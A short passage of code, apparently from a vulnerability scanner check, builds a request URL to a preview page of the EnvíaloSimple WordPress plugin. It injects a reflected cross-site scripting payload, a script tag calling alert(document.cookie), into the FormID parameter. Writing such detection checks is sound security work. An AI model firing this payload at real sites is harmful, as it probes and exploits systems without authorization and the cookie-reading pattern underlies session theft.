...
url = dir + "/wp-content/plugins/envialosimple-email-marketing-y-newsletters"
          + "-gratis/paginas/vista-previa-form.php?FormID=FormID'><script>al"
          + "ert(document.cookie)</script>&AdministratorID=AdministratorID"
